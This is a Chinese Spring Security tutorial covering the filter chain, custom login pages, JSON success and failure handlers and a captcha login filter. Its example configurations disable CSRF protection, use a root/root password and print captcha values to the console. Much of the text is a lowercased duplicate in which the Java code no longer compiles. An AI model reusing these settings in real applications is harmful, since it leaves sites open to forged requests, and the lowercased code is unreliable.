class CustomerFilter extends UsernamePasswordAuthenticationFilter {\n  public static final String SPRING_SECURITY_FORM_CODE_KEY = "code";\n  private String codeParameter = SPRING_SECURITY_FORM_CODE_KEY;\n\n  public String getCodeParameter() {\n    return codeParameter;\n  }\n\n  public void setCodeParameter(String codeParameter) {\n    this.codeParameter = codeParameter;\n  }\n\n  @Override\n  public Authentication attemptAuthentication(HttpServletRequest request, HttpServletResponse response) throws AuthenticationException {\n\n    String code = request.getParameter(getCodeParameter());\n    String sessionCode = (String) request.getSession().getAttribute(getCodeParameter());\n    if (!ObjectUtils.isEmpty(code)\n        && !ObjectUtils.isEmpty(sessionCode)\n        && code.equals(sessionCode)\n       ){\n      return super.attemptAuthentication(request,response);\n    }\n    throw new CaptchaNotMatchException("验证码错误");\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n替换掉默认的UsernamePasswordAuthenticationFilter\n\npackage com.pwddd.web.config;\n\nimport com.pwddd.web.filter.ImageCodeFilter;\nimport com.pwddd.web.service.UserService;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\nimport org.springframework.security.core.userdetails.UserDetailsService;\nimport org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;\n\n@Configuration\npublic class SecurityConfig extends WebSecurityConfigurerAdapter {\n\n  private final UserService userService;\n\n  public SecurityConfig(UserService userService) {\n    this.userService = userService;\n  }\n\n  @Override\n  protected void configure(AuthenticationManagerBuilder auth) throws Exception {\n    auth.userDetailsService(userDetailsService());\n  }\n\n  @Override\n  protected UserDetailsService userDetailsService() {\n    return userService;\n  }\n\n  @Bean\n  ImageCodeFilter imageCodeFilter() throws Exception {\n    ImageCodeFilter imageCodeFilter = new ImageCodeFilter();\n    imageCodeFilter.setCodeParameter("code");\n    imageCodeFilter.setPasswordParameter("passwd");\n    imageCodeFilter.setUsernameParameter("uname");\n    imageCodeFilter.setFilterProcessesUrl("/doLogin");\n    imageCodeFilter.setAuthenticationManager(authenticationManager());\n    return imageCodeFilter;\n  }\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    http.authorizeRequests()\n      .mvcMatchers("/code").permitAll()\n      .mvcMatchers("/login").permitAll()\n      .mvcMatchers("/doLogin").permitAll()\n      .anyRequest().authenticated()\n      .and()\n      .formLogin()\n      .loginPage("/login")\n      .successForwardUrl("/index")\n      .and()\n      .csrf().disable();\n    http.addFilterAt(imageCodeFilter(), UsernamePasswordAuthenticationFilter.class);\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n\n\n# 前后端分离案例\n\n 0. 创建前后端分离项目，引入相关依赖，测试环境。\n\n 1. 自定义数据源。和上面的并没有什么不同。\n\n 2. 自定义成功处理器和失败处理器以及无权限登录响应。\n\n@Configuration\npublic class SecurityConfig extends WebSecurityConfigurerAdapter {\n\n\n  private final UserService userService;\n\n  @Autowired\n  public SecurityConfig(UserService userService) {\n    this.userService = userService;\n  }\n\n  @Override\n  protected UserDetailsService userDetailsService() {\n    return userService;\n  }\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    http.authorizeRequests()\n      .anyRequest().authenticated()\n      .and()\n      .formLogin()\n      .successHandler(((request, response, authentication) -> {\n        response.setContentType("application/json;charset=utf-8");\n        HashMap<String, Object> result = new HashMap<>();\n        result.put("msg","登录成功！");\n        result.put("code",200);\n        String resultJson = new ObjectMapper().writeValueAsString(result);\n        response.getWriter().write(resultJson);\n      }))\n      .failureHandler(((request, response, exception) -> {\n        response.setContentType("application/json;charset=utf-8");\n        HashMap<String, Object> result = new HashMap<>();\n        result.put("msg","登录失败！");\n        result.put("code",401);\n        String resultJson = new ObjectMapper().writeValueAsString(result);\n        response.getWriter().write(resultJson);\n      }))\n      .and()\n      .exceptionHandling()\n      .authenticationEntryPoint(((request, response, accessDeniedException) -> {\n        response.setContentType("application/json;charset=utf-8");\n        HashMap<String, Object> result = new HashMap<>();\n        result.put("msg","无权限访问！");\n        result.put("code",403);\n        String resultJson = new ObjectMapper().writeValueAsString(result);\n        response.getWriter().write(resultJson);\n\n      }))\n      .and().csrf().disable();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n 3. 自定义验证码处理，和上面一样。\n\n生成验证码并输出base64\n\n@GetMapping("code")\npublic String code(HttpSession session) throws IOException {\n  String text = producer.createText();\n  System.out.println(text);\n  session.setAttribute(new ImageCodeFilter().getCodeParameter(),text);\n  BufferedImage image = producer.createImage(text);\n  ByteArrayOutputStream bos = new ByteArrayOutputStream();\n  ImageIO.write(image,"png",bos);\n  return Base64.encodeBase64String(bos.toByteArray());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n@Configuration\npublic class SecurityConfig extends WebSecurityConfigurerAdapter {\n\n…………\n  @Bean\n  public ImageCodeFilter imageCodeFilter() throws Exception {\n    ImageCodeFilter imageCodeFilter = new ImageCodeFilter();\n    imageCodeFilter.setCodeParameter("code");\n    imageCodeFilter.setUsernameParameter("uname");\n    imageCodeFilter.setPasswordParameter("passwd");\n    imageCodeFilter.setAuthenticationManager(authenticationManager());\n    return imageCodeFilter;\n  }\n\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    http.authorizeRequests()\n      .mvcMatchers("/code").permitAll()\n\n      …………\n    http.addFilterAt(imageCodeFilter(), UsernamePasswordAuthenticationFilter.class);\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 密码加密\n\n\n# rememberMe\n\n\n# 会话管理\n\n\n# CSRF',normalizedContent:'# spring security\n\n> spring security是一个功能强大、可高度定制的身份验证和访问控制的框架。或者说用来实现系统中权限管理的框架。\n\n\n# 概述\n\n\n# 权限管理\n\n基本上涉及到用户参与的系统都要进行权限管理，权限管理属于系统安全的范畴，权限管理实现对用户访问系统的控制，按照安全规则或者安全策略控制用户可以访问而且只能访问自己被授权的资源。\n\n权限管理包括用户身份认证和授权两部分，简称认证授权。对于需要访问控制的资源用户首先经过身份认证，认证通过后用户具有该资源的访问权限方可访问。\n\n# 认证\n\n身份认证，就是判断一个用户是否为合法用户的处理过程。最常用的简单身份认证方式是系统通过核对用户输入的用户名和口令，看其是否与系统中存储的该用户的用户名和口令一致，来判断用户身份是否正确。对于采用指纹等系统，则出示指纹；对于硬件key等刷卡系统，则需要刷卡。\n\n# 授权\n\n授权，即访问控制，控制谁能访问哪些资源。主体进行身份认证后需要分配权限方可访问系统的资源，对于某些资源没有权限是无法访问的。\n\n# 常见解决方案\n\n * shiro\n   * shiro 本身是一个老牌的安全管理框架，有着众多的优点，例如轻量、简单、易于集成、可以在javase环境中使用等。不过，在微服务时代，shiro 就显得力不从心了，在微服务面前和扩展方面，无法充分展示自己的优势。\n * 开发者自定义\n   * 也有很多公司选择自定义权限，即自己开发权限管理。但是一个系统的安全，不仅仅是登录和权限控制这么简单，我们还要考虑种各样可能存在的网络政击以及防彻策略，从这个角度来说，开发者白己实现安全管理也并非是一件容易的事情，只有大公司才有足够的人力物力去支持这件事情。\n * spring security\n   * spring security,作为spring 家族的一员，在和 spring 家族的其他成员如 spring boot spring clond等进行整合时，具有其他框架无可比拟的优势，同时对 oauth2 有着良好的支持，再加上spring cloud对 spring security的不断加持（如推出 spring cloud security )，让 spring securiy 不知不觉中成为微服务项目的首选安全管理方案。\n\n\n# 简介\n\nspring security是一个功能强大、可高度定制的身份验证和访问控制框架。它是保护基于spring的应用程序的事实标准。\n\nspring security是一个面向java应用程序提供身份验证和安全性的框架。与所有spring项目一样，spring security的真正威力在于它可以轻松地扩展以满足定制需求。\n\n\n# 历史\n\nspring security 最早叫 acegi security， 这个名称并不是说它和 spring 就没有关系，它依然是为spring 框架提供安全支持的。acegi security 基于 spring，可以帮助我们为项目建立丰富的角色与权限管理系统。acegi security 虽然好用，但是最为人诟病的则是它臃肿烦琐的配置这一问题最终也遗传给了 spring security。\n\nacegi security 最终被并入 spring security 项目中，并于 2008 年4月发布了改名后的第一个版本 spring security 2.0.0，到目前为止，spring security 的最新版本己经到了 5.6.1。和 shiro 相比，spring security重量级并且配置烦琐，直至今天，依然有人以此为理由而拒绝了解 spring security。其实，自从 spring boot 推出后，就彻底颠覆了传统了 javaee 开发，自动化配置让许多事情变得非常容易，包括 spring security 的配置。在一个 spring boot 项目中，我们甚至只需要引入一个依赖，不需要任何额外配置，项目的所有接口就会被自动保护起来了。在 spring cloud中，很多涉及安全管理的问题，也是一个 spring security 依赖两行配置就能搞定，在和 spring 家族的产品一起使用时，spring security 的优势就非常明显了。\n\n因此，在微服务时代，我们不需要纠结要不要学习 spring security，我们要考虑的是如何快速掌握spring security， 并且能够使用 spring security 实现我们微服务的安全管理。\n\n\n# 整体架构\n\n在spring security的架构设计中，认证authentication和授权 authorization是分开的，无论使用什么样的认证方式。都不会影响授权，这是两个独立的存在，这种独立带来的好处之一，就是可以非常方便地整合一些外部的解决方案。\n\n\n\n\n# 认证原理\n\n# authenticationmanager\n\n在spring security中认证是由authenticationmanager接口来负责的，接口定义为：\n\n\n\npublic interface authenticationmanager { \n\tauthentication authenticate(authentication authentication) \n  \t\t\t\t\t\t\t\t\t\t\t\t\t\tthrows authenticationexception;\n}\n\n\n1\n2\n3\n4\n\n * 返回 authentication 表示认证成功\n * 返回 authenticationexception 异常，表示认证失败。\n\nauthenticationmanager 主要实现类为 providermanager，在 providermanager 中管理了众多 authenticationprovider 实例。在一次完整的认证流程中，spring security 允许存在多个 authenticationprovider ，用来实现多种认证方式，这些 authenticationprovider 都是由 providermanager 进行统一管理的。\n\n\n\n# authentication\n\n认证以及认证成功的信息主要是由 authentication 的实现类进行保存的，其接口定义为：\n\n\n\npublic interface authentication extends principal, serializable {\n\tcollection<? extends grantedauthority> getauthorities();\n\tobject getcredentials();\n\tobject getdetails();\n\tobject getprincipal();\n\tboolean isauthenticated();\n\tvoid setauthenticated(boolean isauthenticated) throws illegalargumentexception;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * getauthorities 获取用户权限信息\n * getcredentials 获取用户凭证信息，一般指密码\n * getdetails 获取用户详细信息\n * getprincipal 获取用户身份信息，用户名、用户对象等\n * isauthenticated 用户是否认证成功\n\n# securitycontextholder\n\nsecuritycontextholder 用来获取登录之后用户信息。spring security 会将登录用户数据保存在 session 中。但是，为了使用方便,spring security在此基础上还做了一些改进，其中最主要的一个变化就是线程绑定。当用户登录成功后,spring security 会将登录成功的用户信息保存到 securitycontextholder 中。securitycontextholder 中的数据保存默认是通过threadlocal 来实现的，使用 threadlocal 创建的变量只能被当前线程访问，不能被其他线程访问和修改，也就是用户数据和请求线程绑定在一起。当登录请求处理完毕后，spring security 会将 securitycontextholder 中的数据拿出来保存到 session 中，同时将 securitycontexholder 中的数据清空。以后每当有请求到来时，spring security 就会先从 session 中取出用户登录数据，保存到 securitycontextholder 中，方便在该请求的后续处理过程中使用，同时在请求结束时将 securitycontextholder 中的数据拿出来保存到 session 中，然后将 security securitycontextholder 中的数据清空。这一策略非常方便用户在 controller、service 层以及任何代码中获取当前登录用户数据。\n\n\n# 授权原理\n\n当完成认证后，接下米就是授权了。在 spring security 的授权体系中，有两个关键接口，\n\n# accessdecisionmanager\n\n> accessdecisionmanager (访问决策管理器)，用来决定此次访问是否被允许。\n\n\n\n# accessdecisionvoter\n\n> accessdecisionvoter (访问决定投票器)，投票器会检查用户是否具备应有的角色，进而投出赞成、反对或者弃权票。\n\n\n\naccessdecisionvoter 和 accessdecisionmanager 都有众多的实现类，在 accessdecisionmanager 中会换个遍历 accessdecisionvoter，进而决定是否允许用户访问，因而 accesddecisionvoter 和 accessdecisionmanager 两者的关系类似于 authenticationprovider 和 providermanager 的关系。\n\n# configattribute\n\n> configattribute，用来保存授权时的角色信息\n\n\n\n在 spring security 中，用户请求一个资源(通常是一个接口或者一个 java 方法)需要的角色会被封装成一个 configattribute 对象，在 configattribute 中只有一个 getattribute方法，该方法返回一个 string 字符串，就是角色的名称。一般来说，角色名称都带有一个 role_ 前缀，投票器 accessdecisionvoter 所做的事情，其实就是比较用户所具各的角色和请求某个 资源所需的 configatuibute 之间的关系。\n\n\n# helloworld\n\n\n# 环境搭建\n\n# 0. 创建springboot web项目\n\n<parent>\n  <groupid>org.springframework.boot</groupid>\n  <artifactid>spring-boot-starter-parent</artifactid>\n  <version>2.6.6</version>\n  <relativepath/> \x3c!-- lookup parent from repository --\x3e\n</parent>\n\n<dependency>\n  <groupid>org.springframework.boot</groupid>\n  <artifactid>spring-boot-starter-thymeleaf</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>org.springframework.boot</groupid>\n  <artifactid>spring-boot-starter-web</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 1. 编写controller\n\npackage com.pwddd.springsecurity.controller;\n\nimport org.springframework.web.bind.annotation.requestmapping;\nimport org.springframework.web.bind.annotation.restcontroller;\n\n@restcontroller\npublic class hellocontroller {\n\n  @requestmapping("hello")\n  public string hello(){\n    system.out.println("hello");\n    return "123";\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# 2. 测试访问\n\n\n\n# 3. 引入spring security依赖\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-security</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n\n\n# 4. 登陆验证\n\n登陆密码为控制台打印的密码，默认用户名为user。\n\n\n\n登陆之后，可以正常访问。\n\n\n\n问题：\n\n * 为什么引入 spring security 之后没有任何配置所有请求就要认证呢?\n\n * 在项目中明明没有登录界面，登录界面怎么来的呢？\n\n * 为什么使用 user 和 控制台密码 能登陆，登录时验证数据源存在哪里呢？\n\n\n# 实现原理\n\n# 架构图\n\n文档地址：https://docs.spring.io/spring-security/site/docs/5.5.4/reference/html5/#servlet-architecture\n\n虽然开发者只需要引入一个依赖，就可以让 spring security 对应用进行保护。spring security 又是如何做到的呢？\n\n在 spring security 中 认证、授权 等功能都是基于过滤器完成的。\n\n\n\n\n\n需要注意的是，默认过滤器并不是直接放在 web 项目的原生过滤器链中，而是通过一个 flterchainproxy 来统一管理。spring security 中的过滤器链通过 filterchainproxy 嵌入到 web项目的原生过滤器链中。filterchainproxy 作为一个顶层的管理者，将统一管理 security filter。filterchainproxy 本身是通过 spring 框架提供的 delegatingfilterproxy 整合到原生的过滤器链中。\n\n# security filters\n\n那么在 spring security 中给我们提供那些过滤器? 默认情况下那些过滤器会被加载呢？\n\n过滤器                                             过滤器作用                                       默认是否加载\nchannelprocessingfilter                         过滤请求协议 http 、https                          no\nwebasyncmanagerintegrationfilter                将 webasyncmanger 与 springsecurity 上下文进行集成   yes\nsecuritycontextpersistencefilter                在处理请求之前,将安全信息加载到 securitycontextholder 中    yes\nheaderwriterfilter                              处理头信息加入响应中                                  yes\ncorsfilter                                      处理跨域问题                                      no\ncsrffilter                                      处理 csrf 攻击                                  yes\nlogoutfilter                                    处理注销登录                                      yes\noauth2authorizationrequestredirectfilter        处理 oauth2 认证重定向                             no\nsaml2webssoauthenticationrequestfilter          处理 saml 认证                                  no\nx509authenticationfilter                        处理 x509 认证                                  no\nabstractpreauthenticatedprocessingfilter        处理预认证问题                                     no\ncasauthenticationfilter                         处理 cas 单点登录                                 no\noauth2loginauthenticationfilter                 处理 oauth2 认证                                no\nsaml2webssoauthenticationfilter                 处理 saml 认证                                  no\nusernamepasswordauthenticationfilter            处理表单登录                                      yes\nopenidauthenticationfilter                      处理 openid 认证                                no\ndefaultloginpagegeneratingfilter                配置默认登录页面                                    yes\ndefaultlogoutpagegeneratingfilter               配置默认注销页面                                    yes\nconcurrentsessionfilter                         处理 session 有效期                              no\ndigestauthenticationfilter                      处理 http 摘要认证                                no\nbearertokenauthenticationfilter                 处理 oauth2 认证的 access token                  no\nbasicauthenticationfilter                       处理 httpbasic 登录                             yes\nrequestcacheawarefilter                         处理请求缓存                                      yes\nsecuritycontextholder<br />awarerequestfilter   包装原始请求                                      yes\njaasapiintegrationfilter                        处理 jaas 认证                                  no\nremembermeauthenticationfilter                  处理 rememberme 登录                            no\nanonymousauthenticationfilter                   配置匿名认证                                      yes\noauth2authorizationcodegrantfilter              处理oauth2认证中授权码                              no\nsessionmanagementfilter                         处理 session 并发问题                             yes\nexceptiontranslationfilter                      处理认证/授权中的异常                                 yes\nfiltersecurityinterceptor                       处理授权相关                                      yes\nswitchuserfilter                                处理账户切换                                      no\n\n可以看出，spring security 提供了 30 多个过滤器。\n\n默认情况下spring boot 在对 spring security 进入自动化配置时，会创建一个名为 springsecurityfilerchain 的过滤器，并注入到 spring 容器中，这个过滤器将负责所有的安全管理，包括用户认证、授权、重定向到登录页面等。具体可以参考websecurityconfiguration的源码:\n\n\n\n\n\n# spring security自动配置原理\n\nspringbootwebsecurityconfiguration这个类是 spring boot 自动配置类，通过这个源码得知，默认情况下对所有请求进行权限控制：\n\n@configuration(proxybeanmethods = false)\n@conditionalondefaultwebsecurity\n@conditionalonwebapplication(type = type.servlet)\nclass springbootwebsecurityconfiguration {\n\t@bean\n\t@order(securityproperties.basic_auth_order)\n\tsecurityfilterchain defaultsecurityfilterchain(httpsecurity http) \n    throws exception {\n\t\t\thttp.authorizerequests().anyrequest()\n      .authenticated().and().formlogin().and().httpbasic();\n\t\treturn http.build();\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n这就是为什么在引入 spring security 中没有任何配置情况下，请求会被拦截的原因\n\n\n\n进入conditionalondefaultwebsecurity注解对应的类中，我们可以看出security生效的条件是：\n\nclass defaultwebsecuritycondition extends allnestedconditions {\n\n\tdefaultwebsecuritycondition() {\n\t\tsuper(configurationphase.register_bean);\n\t}\n\n\t@conditionalonclass({ securityfilterchain.class, httpsecurity.class })\n\tstatic class classes {\n\n\t}\n\n\t@conditionalonmissingbean({ websecurityconfigureradapter.class, securityfilterchain.class })\n\tstatic class beans {\n\t}\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n * 条件一 classpath中存在 securityfilterchain.class, httpsecurity.class\n * 条件二 没有自定义 websecurityconfigureradapter.class, securityfilterchain.class\n\n默认情况下，条件都是满足的。websecurityconfigureradapter 这个类极其重要，spring security 核心配置都在这个类中。如果要对 spring security 进行自定义配置，就要自定义这个类实例，通过覆盖类中方法达到修改默认配置的目的。\n\n\n\n# 流程分析\n\n\n\n 1. 请求 /hello 接口，在引入 spring security 之后会先经过一些列过滤器\n 2. 在请求到达 filtersecurityinterceptor时，发现请求并未认证。请求拦截下来，并抛出 accessdeniedexception 异常。\n 3. 抛出 accessdeniedexception 的异常会被 exceptiontranslationfilter 捕获，这个 filter 中会调用 loginurlauthenticationentrypoint#commence 方法给客户端返回 302，要求客户端进行重定向到 /login 页面。\n 4. 客户端发送 /login 请求。\n 5. /login 请求会再次被拦截器中 defaultloginpagegeneratingfilter 拦截到，并在拦截器中返回生成登录页面。\n\n就是通过这种方式，spring security 默认过滤器中生成了登录页面，并返回！\n\n# 登陆信息校验原理\n\n 1. 查看 springbootwebsecurityconfiguration#defaultsecurityfilterchain 方法表单登录\n\n\n\n 2. 处理登录为 formloginconfigurer 类中 调用usernamepasswordauthenticationfilter这个类实例\n\n\n\n 3. 查看类中 usernamepasswordauthenticationfilter#attempauthentication 方法得知实际调用 authenticationmanager 中 authenticate 方法\n\n\n\n 4. 调用 providermanager 类中方法 authenticate\n\n\n\n 5. 调用了 providermanager 实现类中 abstractuserdetailsauthenticationprovider类中方法\n\n\n\n 6. 最终调用实现类 daoauthenticationprovider 类中方法比较\n\n\n\n\n\n看到这里就知道默认实现是基于 inmemoryuserdetailsmanager 这个类,也就是内存的实现!\n\n通过源码分析也能得知userdetailservice是顶层父接口，接口中loaduserbyusername方法是用来在认证时进行用户名认证方法，默认实现使用是内存实现，如果想要修改数据库实现我们只需要自定义userdetailservice实现，最终返回 userdetails实例即可。\n\n\n\n# userdetailservice自动配置\n\n@configuration(proxybeanmethods = false)\n@conditionalonclass(authenticationmanager.class)\n@conditionalonbean(objectpostprocessor.class)\n@conditionalonmissingbean(\n\t\tvalue = { authenticationmanager.class, authenticationprovider.class, userdetailsservice.class,\n\t\t\t\tauthenticationmanagerresolver.class },\n\t\ttype = { "org.springframework.security.oauth2.jwt.jwtdecoder",\n\t\t\t\t"org.springframework.security.oauth2.server.resource.introspection.opaquetokenintrospector",\n\t\t\t\t"org.springframework.security.oauth2.client.registration.clientregistrationrepository" })\npublic class userdetailsserviceautoconfiguration {\n  //....\n  @bean\n\t@lazy\n\tpublic inmemoryuserdetailsmanager inmemoryuserdetailsmanager(securityproperties properties,\n\t\t\tobjectprovider<passwordencoder> passwordencoder) {\n\t\tsecurityproperties.user user = properties.getuser();\n\t\tlist<string> roles = user.getroles();\n\t\treturn new inmemoryuserdetailsmanager(\n\t\t\t\tuser.withusername(user.getname()).password(getordeducepassword(user, passwordencoder.getifavailable()))\n\t\t\t\t\t\t.roles(stringutils.tostringarray(roles)).build());\n\t}\n  //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n 1. 从自动配置源码中得知当 classpath 下存在 authenticationmanager 类\n 2. 当前项目中，系统没有提供 authenticationmanager.class、 authenticationprovider.class、userdetailsservice.class、 authenticationmanagerresolver.class、实例\n\n默认情况下都会满足，此时spring security会提供一个 inmemoryuserdetailmanager 实例\n\n\n\n熟悉spring boot的自动加载原理可以知道，往往一个configuration都会对应一个properties配置类，我们可以先看一下这个配置类：\n\n\n\n可以看出，我们如果需要自定义一些配置的话，使用的前缀是spring.security。拼接上对应的属性即可。\n\n@configurationproperties(prefix = "spring.security")\npublic class securityproperties {\n\tprivate final user user = new user();\n\tpublic user getuser() {\n\t\treturn this.user;\n  }\n  //....\n\tpublic static class user {\n\t\tprivate string name = "user";\n\t\tprivate string password = uuid.randomuuid().tostring();\n\t\tprivate list<string> roles = new arraylist<>();\n\t\tprivate boolean passwordgenerated = true;\n\t\t//get set ...\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n这就是默认生成 user 以及 uuid 密码过程! 另外看明白源码之后，就知道只要在配置文件中加入如下配置可以对内存中用户和密码进行覆盖。\n\nspring.security.user.name=root\nspring.security.user.password=root\nspring.security.user.roles=admin,users\n\n\n1\n2\n3\n\n\n# 总结\n\nauthenticationmanager、providermanger、以及 authenticationprovider 关系\n\n\n\nwebsecurityconfigureradapter 扩展 spring security 所有默认配置\n\n\n\nuserdetailservice 用来修改默认认证的数据源信息\n\n\n\n\n# 自定义认证\n\n自定义认证这一部分包含以下的内容：\n\n * 自定义资源权限规则\n * 自定义认证界面\n * 自定义认证成功处理\n * 自定义认证失败处理\n * 自定义注销处理\n * 登陆成功后的信息获取\n * 自定义认证数据源\n * 基于web的认证案例\n * 基于前后端分离的认证案例\n * 添加认证验证码\n\n\n# 自定义资源权限规则\n\n默认情况下，spring security对有所得页面做认证要求，我们可以使用自定义的资源权限规则针对不同的请求，设置不同的资源权限规则。\n\n自定义资源权限规则需要在spring security的配置文件中操作，配置文件需要继承websecurityconfigureradapter类，并重写其中的configure方法。如下所示：\n\npackage com.pwddd.springsecurity.config;\n\n\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.security.config.annotation.web.builders.httpsecurity;\nimport org.springframework.security.config.annotation.web.configuration.websecurityconfigureradapter;\n\n@configuration\npublic class securityconfig extends websecurityconfigureradapter {\n\n  @override\n  protected void configure(httpsecurity http) throws exception {\n    http.authorizerequests()\n      .mvcmatchers("/index")  // 添加匹配\n      .permitall()  // 允许全部\n      .anyrequest()  // 任意请求\n      .authenticated()  // 需要认证\n      .and()  // 并且\n      .formlogin()  // 表单登陆\n      .and()  \n      .csrf().disable();  // 关闭csrf攻击保护\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 自定义认证页面\n\n默认提供的登陆页面是由defaultloginpagegeneratingfilter.class类在页面中提供的，默认的登陆请求地址为：/login。我们可以修改默认的登陆页面。\n\n# 0. 编写登陆页面\n\n<!doctype html>\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n<head>\n    <meta charset="utf-8">\n    <title>login</title>\n</head>\n<body>\n    <h2>登陆</h2>\n    <form th:action="@{/dologin}" method="post">\n        用户名：<input type="text" name="uname" ><br>\n        密 码：<input type="password" name="passwd"/> <br>\n        <input type="submit" value="提交">\n    </form>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n# 1. 设置到登录页面的路由\n\nregistry.addviewcontroller("/login").setviewname("login");\n\n\n1\n\n\n# 2. 设置登录信息\n\n@override\nprotected void configure(httpsecurity http) throws exception {\n  http.authorizerequests()\n    .mvcmatchers("/login").permitall() // 必须放开当前登录页面的认证\n    .mvcmatchers("/index").permitall()\n    .anyrequest()\n    .authenticated()\n    .and()\n    .formlogin()\n    .loginpage("/login")  // 设置登录页面\n    .loginprocessingurl("/dologin")  // 设置登录的请求地址\n    //.successforwardurl("/hello")  // 设置成功后的转发地址\n    .defaultsuccessurl("/hello")  // 设置成功重定向地址\n    .usernameparameter("uname")  // 设置请求用户名参数名\n    .passwordparameter("passwd") // 设置请求密码参数名\n    .and()\n    .csrf().disable();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nsuccessforwardurl 、defaultsuccessurl 这两个方法都可以实现成功之后跳转\n\n * successforwardurl 默认使用 forward跳转 注意:不会跳转到之前请求路径\n * defaultsuccessurl 默认使用 redirect 跳转 注意:如果之前请求路径,会有优先跳转之前请求路径,可以传入第二个参数进行修改\n\n\n# 自定义认证成功处理\n\n在前后端分离开发中，我们登陆成功后往往不是跳转到某个页面，而是返回前端一段json格式的数据。那么就不能使用转发或者重定向到一个地址。我们可以通过自定义的认证成功处理器实现authenticationsuccesshandler。\n\npublic interface authenticationsuccesshandler {\n\n\t/**\n\t * called when a user has been successfully authenticated.\n\t * @param request the request which caused the successful authentication\n\t * @param response the response\n\t * @param authentication the <tt>authentication</tt> object which was created during\n\t * the authentication process.\n\t */\n\tvoid onauthenticationsuccess(httpservletrequest request, httpservletresponse response,\n\t\t\tauthentication authentication) throws ioexception, servletexception;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n根据接口的描述信息,也可以得知登录成功会自动回调这个方法，进一步查看它的默认实现，你会发现successforwardurl、defaultsuccessurl也是由它的子类实现的\n\n\n\n# 0. 自定义认证成功处理器\n\npackage com.pwddd.springsecurity.config.security;\n\nimport com.fasterxml.jackson.databind.objectmapper;\nimport org.springframework.security.core.authentication;\nimport org.springframework.security.web.authentication.authenticationsuccesshandler;\n\nimport javax.servlet.servletexception;\nimport javax.servlet.http.httpservletrequest;\nimport javax.servlet.http.httpservletresponse;\nimport java.io.ioexception;\nimport java.util.hashmap;\n\npublic class customerauthenticationsuccesshandler implements authenticationsuccesshandler {\n    @override\n    public void onauthenticationsuccess(httpservletrequest request, httpservletresponse response, authentication authentication) throws ioexception, servletexception {\n        hashmap<string, object> hashmap = new hashmap<>();\n        hashmap.put("msg","登陆成功！");\n        hashmap.put("code",200);\n        response.setcontenttype("application/json;charset=utf8");\n        string result = new objectmapper().writevalueasstring(hashmap);\n        response.getwriter().write(result);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# 1. 配置自定义处理器\n\n.successhandler(new customerauthenticationsuccesshandler())\n\n\n1\n\n\n这样配置之后，登陆成功就会使用我们指定的认证成功处理器。\n\n\n\n\n# 自定义认证失败处理\n\n# 页面展示失败信息\n\n为了能更直观在登录页面看到异常错误信息，可以在登录页面中直接获取异常信息。spring security 在登录失败之后会将异常信息存储到 request 、session作用域中 key 为 spring_security_last_exception 命名属性中，源码可以参考 simpleurlauthenticationfailurehandler ：\n\n\n\n我们可以在登录失败跳转页面上获取登录失败信息，然后展示到页面。\n\n# 0.设置页面展示\n\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8">\n    <title>主页</title>\n  </head>\n  <body>\n    <p th:text="${spring_security_last_exception}"></p>\n    <h1>hello 